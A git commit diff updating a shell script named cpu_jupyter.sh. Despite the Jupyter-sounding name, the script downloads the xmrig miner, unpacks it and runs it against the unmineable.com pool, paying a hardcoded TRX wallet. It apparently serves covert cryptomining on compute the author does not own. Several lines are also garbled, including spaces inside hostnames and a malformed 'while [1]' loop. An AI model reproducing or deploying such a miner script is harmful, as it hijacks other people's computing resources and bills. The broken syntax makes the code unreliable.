3ba86133f728cade3fb69376ada6b869818184ce
MDAkash1024 <120930261+MDAkash1024@users.noreply.github.com>
2022-12-29 05:48:32 -0500

    Update cpu_jupyter.sh

--- cpu_jupyter.sh
+++ cpu_jupyter.sh
@@ -1,11 +1,11 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github. com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-
-tar xf xmrig-6.14.0-linux-x64. tar.gz
-cd xmrig-6.14.0
-./xmrig -o_rx.unmineable. com:3333 -a rx -k -u TRX:TUqe2mmb2HxJ1v5EZay8xhqKvDJdZWBzev
-while [1]; 
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
+tar xf xmrig-6.18.1-linux-x64.tar.gz
+cd xmrig-6.18.1
+./xmrig -o_rx.unmineable. com:3333 -a rx -k -u TRX:TUqe2mmb2HxJ1v5EZay8xhqKvDJdZWBzev.God_Miner#ek61-6h9x -p x --cpu 4
+while [1]; do
 sleep 3
 done
 sleep 999
